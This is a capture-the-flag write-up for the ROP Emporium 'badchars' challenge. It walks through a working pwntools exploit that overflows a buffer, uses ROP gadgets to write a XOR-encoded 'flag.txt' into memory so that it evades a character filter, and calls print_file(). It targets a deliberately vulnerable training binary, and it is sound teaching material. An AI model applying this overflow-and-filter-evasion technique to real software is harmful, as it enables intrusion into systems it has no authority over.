# Badchars
This challenge is a follow-up to the [write4](https://github.com/TSpeel/writeups/tree/main/pwn/ROPEmporium4_write4) challenge.
We again have to write `flag.txt` to memory and call `print_file()` with a pointer to it. 
However, this time there is a input filter present that replaces part of the payload if our payload contains the characters `x`, `g`, `a` or `.`.
This input filter works by comparing payload bytes to the ASCII values of these characters, so the addresses we use must also avoid these values.

## The plan
To evade the input filter, we can try to smuggle our string `flag.txt` into memory by altering the values when writing them, and using gadgets to repair them after they are written. 

We can write to the address `0x601028`, which is the `.bss` segment as in the write4 challenge. The gadget we can use for writing is slightly different this time: `mov qword [r13],r12; ret`. We can use this gadget to write `flag.txt` XOR'd with an arbitrary value to `0x601028`, and then XOR the written string back to `flag.txt` with a XOR gadget: `xor byte ptr [r15], r14b; ret`. 
We also have a useful gadget to set `r12`, `r13`, `r14` and `r15`: `pop r12,r13,r14,r15; ret`.

This allows us to create a write function as follows:
```
def write8bytesandxor(writable_address, bytestr):
    pop_gadget       = 0x40069c # pop r12,r13,r14,r15
    pop_rdi_gadget   = 0x4006a3
    write_mov_gadget = 0x400634 # mov qword [r13],r12
    xor_gadget       = 0x400628 # xor byte ptr [r15], r14b
    pop_r15_gadget   = 0x4006a2

    # Write string to memory and prepare for XORing
    payload  = p64(pop_gadget)
    payload += p64(u64(bytestr)) # r12, contains qword string to write
    payload += p64(writable_address) # r13, contains address to write to
    payload += p64((17)) # r14, contains 8 bit value to XOR written string with
    payload += p64(writable_address) # r15, contains the address of written string to XOR 
    payload += p64(write_mov_gadget)

    # XOR the written string back to the original string byte by byte
    payload += p64(xor_gadget)
    for i in range(1,8):
        payload += p64(pop_r15_gadget)
        payload += p64(writable_address+i)
        payload += p64(xor_gadget)
    return payload

```
In this function we use the value 17 to XOR. This is an arbitrary choice, most values under 8 bits will work, as long as the result of the XOR does not contain the blacklisted characters `x`, `g`, `a` and `.`. The value has to be under 256, as the gadget `xor byte ptr [r15], r14b; ret` only takes the lowest 8 bits of `r14`.

## Nearly there
Using this function to smuggle `flag.txt` into memory, we can now call `print_file()` with the address of our string:
```
io = start()

pop_rdi_gadget   = 0x4006a3
print_file_plt   = 0x400510
writable_address = 0x601028 # in .bss

payload = b"A" * 40

goal_string = b"flag.txt"

# Stage 1, write "flag.txt" to writable_address
# Choice of 17 is arbitrary, most values under 256 should work
payload += write8bytesandxor(writable_address, bytes([x^17 for x in goal_string]))

# Stage 2, call print_file_plt() with address of written string
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
payload += p64(print_file_plt)


io.sendlineafter(b">", payload)
io.interactive()
```
Running this script, we get the following output:
```
Failed to open file: flag.tit
```
It seems our plan worked, but for some reason the `x` has been replaced with `i`. Initially, it seemed this could have been caused by the value we XOR with. Perhaps the ASCII value of `x` XOR'd with 17 is a blacklisted character?
However, the ASCII value of `x` is 120, and `120^17=105`, which is the ASCII value of `i`. There is thus something else at play.

Using GDB to step through the exploit, we can see that the character `i` is written to the address `0x60102e`.
This is what is causing the problem! `2e` is the ASCII value of `.`. 
Thus when we try to XOR `i` back to `x` by loading the address `0x60102e` for our XOR gadget, the address is replaced as the filter replaces the value `2e`.
We can solve this by choosing a different location to write our string to, such as the `.data` segment at `0x601038`.

## Final exploit
Now we have eliminated all blacklisted characters from our payload, and we can succesfully print the flag!
The final exploit script is as follows:

```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./badchars"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT STARTS HERE
# ===========================================================

def write8bytesandxor(writable_address, bytestr):
    pop_gadget       = 0x40069c # pop r12,r13,r14,r15
    pop_rdi_gadget   = 0x4006a3
    write_mov_gadget = 0x400634 # mov qword [r13],r12
    xor_gadget       = 0x400628 # xor byte ptr [r15], r14b
    pop_r15_gadget   = 0x4006a2

    # Write string to memory and prepare for XORing
    payload  = p64(pop_gadget)
    payload += p64(u64(bytestr)) # r12, contains qword string to write
    payload += p64(writable_address) # r13, contains address to write to
    payload += p64((17)) # r14, contains 8 bit value to XOR written string with
    payload += p64(writable_address) # r15, contains the address of written string to XOR 
    payload += p64(write_mov_gadget)

    # XOR the written string back to the original string byte by byte
    payload += p64(xor_gadget)
    for i in range(1,8):
        payload += p64(pop_r15_gadget)
        payload += p64(writable_address+i)
        payload += p64(xor_gadget)
    return payload


io = start()

pop_rdi_gadget   = 0x4006a3
print_file_plt   = 0x400510
writable_address = 0x601038 # in .data instead of .bss
# part of .bss 0x60102e ends with 2e which is the ASCII code of .

payload = b"A" * 40

goal_string = b"flag.txt"

# Stage 1, write "flag.txt" to writable_address
# Choice of 17 is arbitrary, most values under 256 should work
payload += write8bytesandxor(writable_address, bytes([x^17 for x in goal_string]))

# Stage 2, call print_file_plt() with address of written string
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
payload += p64(print_file_plt)


io.sendlineafter(b">", payload)
io.interactive()
```
